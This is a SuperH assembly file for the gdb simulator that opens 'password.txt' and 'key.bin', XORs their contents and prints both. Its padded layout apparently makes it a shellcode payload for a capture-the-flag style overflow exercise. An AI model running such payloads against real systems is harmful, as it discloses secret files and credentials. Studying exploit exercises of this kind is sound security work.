/*
 * Use monitor trap.
 * See gdb/sim/sh/interp.c:trap()
 */

#define SYS_exit  1
#define SYS_read  3
#define SYS_write 4
#define SYS_open  5
#define SYS_close 6

	.org	0x1c10 - 4 - 128 - 128 - 4 - 4 - 16

	.section .text

	.globl	_start
	.type	_start, @function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

	.long	_code

_code:
	mov.l	_start_addr, sp

	/*
	 * SYSCALL NO: R4
	 * ARG1-3: R5-R7
	 * RETVAL: R0
	 * ERRCODE: R1
	 */

___r_open:
	mov.l	_fname_addr, r5
	mov	#0, r6
	mov	#SYS_open, r4
	trapa	#34
	nop

___r_read:
	mov	r0, r5
	mov.l	_buffer_addr, r6
	mov	#16, r7
	mov	#SYS_read, r4
	trapa	#34
	nop

_save_size:
	mov	r0, r8

___r_kopen:
	mov.l	_kname_addr, r5
	mov	#0, r6
	mov	#SYS_open, r4
	trapa	#34
	nop

___r_kread:
	mov	r0, r5
	mov.l	_kbuffer_addr, r6
	mov	r8, r7
	mov	#SYS_read, r4
	trapa	#34
	nop

_exchange:
	mov.l	_buffer_addr, r4
	mov.l	_kbuffer_addr, r5
	mov	r4, r0
	add	r8, r0
1:	mov.b	@r4, r6
	mov.b	@r5+, r7
	xor	r7, r6
	mov.b	r6, @r4
	add	#1, r4
	cmp/eq	r4, r0
	bf	1b

___r_write:
	mov	#1, r5
	mov.l	_buffer_addr, r6
	mov	r8, r7
	mov	#SYS_write, r4
	trapa	#34
	nop

___r_kwrite:
	mov	#1, r5
	mov.l	_kbuffer_addr, r6
	mov	r8, r7
	mov	#SYS_write, r4
	trapa	#34
	nop

___r_exit:
	mov	#0, r5
	mov	#SYS_exit, r4
	trapa	#34
	nop

_fname:	.string	"password.txt"
_kname:	.string	"key.bin"

#if 0
	.align 4 /* aligned by 16 bytes to avoid bus error */
#else
	.align 2
#endif
_start_addr:
	.long	_start
_fname_addr:
	.long	_fname
_kname_addr:
	.long	_kname
_buffer_addr:
	.long	_buffer
_kbuffer_addr:
	.long	_kbuffer
_code_end:

_buffer:
	.space	16
_kbuffer:
	.space	16
